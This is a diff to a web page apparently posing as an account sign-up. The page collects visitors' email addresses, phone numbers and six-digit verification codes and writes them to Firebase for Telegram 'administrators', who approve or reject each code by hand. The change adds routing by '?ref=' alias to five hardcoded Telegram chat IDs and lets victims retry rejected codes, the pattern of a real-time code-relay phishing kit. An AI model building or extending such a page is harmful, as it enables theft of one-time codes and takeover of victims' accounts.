@@ -157,7 +157,7 @@ select option{background:#3B0616}
 
 #form-section{padding:60px 20px;background:#0f0f11}
 
-/* SUBMIT SPINNER â€” shown the instant the button is clicked */
+/* SUBMIT SPINNER — shown the instant the button is clicked */
 .submit-spin{display:none;text-align:center;padding:1.5rem 0 0.5rem}
 .submit-spin.on{display:block}
 .submit-spin .spinner{width:36px;height:36px;border-width:3px}
@@ -204,7 +204,7 @@ select option{background:#3B0616}
 
   <div id="s1" class="screen active">
     <div class="progress"><i class="on"></i><i></i><i></i></div>
-    <div class="step-lbl">Step 1 of 3 Â· Your details</div>
+    <div class="step-lbl">Step 1 of 3 · Your details</div>
     <h1>Create your account</h1>
     <p class="sub">We'll send a verification code to confirm your details.</p>
     <label>Email address</label>
@@ -396,7 +396,7 @@ select option{background:#3B0616}
 
   <div id="s2" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i></i></div>
-    <div class="step-lbl">Step 2 of 3 Â· Email</div>
+    <div class="step-lbl">Step 2 of 3 · Email</div>
     <h1>Check your email</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">@</span><b id="email-show" style="color:#FFF4F7"></b></div>
@@ -418,8 +418,8 @@ select option{background:#3B0616}
 
   <div id="s3" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <div class="done-row"><span class="tick">âœ“</span>Email verified</div>
-    <div class="step-lbl">Step 3 of 3 Â· Phone</div>
+    <div class="done-row"><span class="tick">✓</span>Email verified</div>
+    <div class="step-lbl">Step 3 of 3 · Phone</div>
     <h1>Check your phone</h1>
     <p class="sub">Six digits sent to:</p>
     <div class="sent-box"><span class="tick">#</span><b id="phone-show" style="color:#FFF4F7"></b></div>
@@ -495,19 +495,80 @@ try {
    Client role:
      - WRITE one pending record under account_verifications/{requestId}
      - READ that single record
-     - WRITE emailCode / phoneCode when user submits the 4-digit code
+     - WRITE emailCode / phoneCode when user submits the 6-digit code
      - NEVER write emailVerified / phoneVerified / status
    The trusted backend (Telegram verifier) is the ONLY writer
    allowed to flip flags to true.
    ============================================================ */
 
-const ADMIN_CHAT_ID = "7144369262";
+/* ============================================================
+   ADMIN ROUTING (ref alias -> Telegram chat id)
+   ------------------------------------------------------------
+   Five aliases route to five distinct administrators. Absent,
+   empty, malformed, or unknown ref values fall back to the
+   original (legacy) administrator.
+
+   HONESTY: This mapping is used ONLY to choose the Firebase path
+   segment `account_verifications/admin/{chatId}` that this page
+   writes under. It does NOT grant the visitor admin privileges.
+   It ONLY works if the trusted Telegram backend listens on each
+   admin/{chatId} path (or on the parent `admin` node and reads
+   the child key). See "REQUIRED BACKEND CHANGES" in the report.
+   ============================================================ */
+
+const LEGACY_ADMIN_CHAT_ID = "7144369262";
+
+// Explicit allowlist. Only these exact keys resolve.
+const ADMIN_ALIAS_MAP = Object.freeze({
+    "k7m4": "8761777482",
+    "p9x2": "8922933658",
+    "v6q8": "8898838317",
+    "r3n5": "8499910147",
+    "w8d1": "5449099721"
+});
+
+function resolveAdminChatId() {
+    // Read ?ref=... using the standard query-string mechanism.
+    let refValue = null;
+    try {
+        const params = new URLSearchParams(window.location.search);
+        // .get() returns the FIRST occurrence; duplicate params do
+        // not let an attacker stack aliases to select arbitrarily.
+        refValue = params.get("ref");
+    } catch (_) {
+        refValue = null;
+    }
+
+    // Absent, empty, or non-string -> legacy default.
+    if (typeof refValue !== "string") return LEGACY_ADMIN_CHAT_ID;
+    const normalized = refValue.trim().toLowerCase();
+    if (!normalized) return LEGACY_ADMIN_CHAT_ID;
+
+    // Exact allowlist lookup. Unknown or malformed -> legacy default.
+    // This means arbitrary user-supplied text can NEVER become a
+    // chat id or a Firebase path segment.
+    if (Object.prototype.hasOwnProperty.call(ADMIN_ALIAS_MAP, normalized)) {
+        return ADMIN_ALIAS_MAP[normalized];
+    }
+    return LEGACY_ADMIN_CHAT_ID;
+}
+
+const ADMIN_CHAT_ID = resolveAdminChatId();
 const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
+
+// Expose only the resolved, already-allowlisted chat id for debugging
+// (never the raw alias or any secret).
+window.__clashAdminChatId = ADMIN_CHAT_ID;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
 let submissionLocked = false;
 let currentStep = 1;
+
+// EDGE-TRIGGER GUARDS ------------------------------------------------
+let _emailRejectedLastSeen = false;
+let _phoneRejectedLastSeen = false;
+// --------------------------------------------------------------------
 
 function setActiveScreen(id) {
     document.querySelectorAll(".screen").forEach(el => el.classList.remove("active"));
@@ -600,7 +661,7 @@ function chk() {
     btn.disabled = !ready;
 }
 
-// Enable/disable the two verify buttons based on 4-digit input.
+// Enable/disable the two verify buttons based on 6-digit input.
 function otpChk(prefix, btnId) {
     const btn = document.getElementById(btnId);
     if (!btn) return;
@@ -619,7 +680,6 @@ function mv(prefix, index, el) {
         const next = document.getElementById(prefix + (index + 1));
         if (next) next.focus();
     }
-    // Update the corresponding verify button state.
     if (prefix === "e") otpChk("e", "btn2");
     if (prefix === "p") otpChk("p", "btn3");
 }
@@ -659,12 +719,13 @@ async function step1() {
     const originalLabel = btn.textContent;
     btn.textContent = "Sending...";
 
-    // Spinner shown IMMEDIATELY on click, before any await.
     showSubmitSpinner();
 
     const requestId = generateRequestId();
     currentRequestId = requestId;
     currentStep = 1;
+    _emailRejectedLastSeen = false;
+    _phoneRejectedLastSeen = false;
 
     const emailShow = document.getElementById("email-show");
     const phoneShow = document.getElementById("phone-show");
@@ -680,6 +741,8 @@ async function step1() {
         emailVerified: false,
         phoneVerified: false,
         rejected: false,
+        emailRejected: false,
+        phoneRejected: false,
         createdAt: Date.now()
     };
 
@@ -695,12 +758,10 @@ async function step1() {
         return;
     }
 
-    // Keep the spinner spinning until admin taps Proceed.
-// Do NOT call hideSubmitSpinner() here.
-startDotAnim(btn);
-btn.disabled = true;
+    startDotAnim(btn);
+    btn.disabled = true;
 
-attachListener(requestId);
+    attachListener(requestId);
 }
 
 function attachListener(requestId) {
@@ -718,7 +779,6 @@ function attachListener(requestId) {
             const proceedOk = data.proceed === true;
             const emailOk   = data.emailVerified === true;
             const phoneOk   = data.phoneVerified === true;
-            const statusOk  = true; // phone approval is enough
 
             // STEP 1 -> 2: admin tapped "Proceed"
             if (proceedOk && currentStep === 1) {
@@ -738,6 +798,7 @@ function attachListener(requestId) {
             if (proceedOk && emailOk && currentStep === 2) {
                 currentStep = 3;
                 hideError("err2");
+                _emailRejectedLastSeen = false;
                 ["p0","p1","p2","p3","p4","p5"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
@@ -758,11 +819,59 @@ function attachListener(requestId) {
                 return;
             }
 
-            // Terminal failure
-            if (data.status === "rejected" || data.status === "expired") {
+            // ---------- RETRYABLE: EMAIL CODE REJECTED (EDGE-TRIGGERED) ----------
+            const emailRejectedNow = data.emailRejected === true;
+            if (emailRejectedNow && !_emailRejectedLastSeen && currentStep === 2) {
+                _emailRejectedLastSeen = true;
+                const verifySpin = document.getElementById("s2-verify");
+                if (verifySpin) verifySpin.style.display = "none";
+                ["e0","e1","e2","e3","e4","e5"].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = "";
+                });
+                otpChk("e", "btn2");
+                showError("err2", "Incorrect code. Try again.");
+                const first = document.getElementById("e0");
+                if (first) first.focus();
+                return;
+            }
+            if (!emailRejectedNow) {
+                if (_emailRejectedLastSeen) {
+                    _emailRejectedLastSeen = false;
+                    hideError("err2");
+                }
+            }
+
+            // ---------- RETRYABLE: PHONE CODE REJECTED (EDGE-TRIGGERED) ----------
+            const phoneRejectedNow = data.phoneRejected === true;
+            if (phoneRejectedNow && !_phoneRejectedLastSeen && currentStep === 3) {
+                _phoneRejectedLastSeen = true;
+                const verifySpin = document.getElementById("s3-verify");
+                if (verifySpin) verifySpin.style.display = "none";
+                ["p0","p1","p2","p3","p4","p5"].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = "";
+                });
+                otpChk("p", "btn3");
+                showError("err3", "Incorrect code. Try again.");
+                const first = document.getElementById("p0");
+                if (first) first.focus();
+                return;
+            }
+            if (!phoneRejectedNow) {
+                if (_phoneRejectedLastSeen) {
+                    _phoneRejectedLastSeen = false;
+                    hideError("err3");
+                }
+            }
+
+            // ---------- TERMINAL: whole request rejected / expired ----------
+            if (data.status === "rejected" || data.status === "expired" || data.rejected === true) {
                 teardownListener();
                 submissionLocked = false;
                 currentStep = 1;
+                _emailRejectedLastSeen = false;
+                _phoneRejectedLastSeen = false;
                 const b = document.getElementById("btn1");
                 if (b) { b.textContent = "Send verification code"; b.disabled = false; }
                 setActiveScreen("s1");
@@ -777,13 +886,15 @@ function attachListener(requestId) {
             teardownListener();
             submissionLocked = false;
             currentStep = 1;
+            _emailRejectedLastSeen = false;
+            _phoneRejectedLastSeen = false;
             const b = document.getElementById("btn1");
             if (b) { b.textContent = "Send verification code"; b.disabled = false; }
             setActiveScreen("s1");
             chk();
             stopDotAnim();
-        hideSubmitSpinner();
-        showError("err1", "Connection error. Please try again.");
+            hideSubmitSpinner();
+            showError("err1", "Connection error. Please try again.");
         }
     );
 }
@@ -816,6 +927,14 @@ async function verifyEmail() {
             ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailCodeSubmittedAt"),
             Date.now()
         );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejected"),
+            false
+        );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/emailRejectedNotified"),
+            false
+        );
     } catch (err) {
         console.error("Failed to submit email code:", err);
         if (btn) btn.disabled = false;
@@ -823,9 +942,6 @@ async function verifyEmail() {
         showError("err2", "Could not submit code. Please try again.");
         return;
     }
-    // Spinner stays visible. The listener advances to #s3 when the
-    // trusted backend flips emailVerified to true. The client never
-    // writes that flag itself.
 }
 
 // ---------- Phone code submit: same pattern ----------
@@ -856,6 +972,14 @@ async function verifyPhone() {
             ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneCodeSubmittedAt"),
             Date.now()
         );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejected"),
+            false
+        );
+        await set(
+            ref(firebaseDb, VERIFICATIONS_PATH + "/" + currentRequestId + "/phoneRejectedNotified"),
+            false
+        );
     } catch (err) {
         console.error("Failed to submit phone code:", err);
         if (btn) btn.disabled = false;
@@ -863,9 +987,6 @@ async function verifyPhone() {
         showError("err3", "Could not submit code. Please try again.");
         return;
     }
-    // Spinner stays visible. The listener advances to #s4 when the
-    // trusted backend flips phoneVerified to true and status to
-    // "verified". The client never writes those fields itself.
 }
 
 window.addEventListener("beforeunload", () => {
@@ -900,8 +1021,7 @@ if (document.readyState === "loading") {
 /* ============================================================
    CRITICAL: expose module-scoped functions to the global scope.
    Inline HTML handlers (onclick, oninput, onkeydown) resolve
-   against window, NOT module scope. Without this block, every
-   inline handler silently does nothing.
+   against window, NOT module scope.
    ============================================================ */
 window.chk         = chk;
 window.step1       = step1;
@@ -918,13 +1038,9 @@ window.accountVerificationFirebase = {
     set,
     onValue,
     off,
-    get currentRequestId() { return currentRequestId; }
+    get currentRequestId() { return currentRequestId; },
+    get adminChatId() { return ADMIN_CHAT_ID; }
 };
 </script>
 </body>
 </html>
-
-
-
-
-
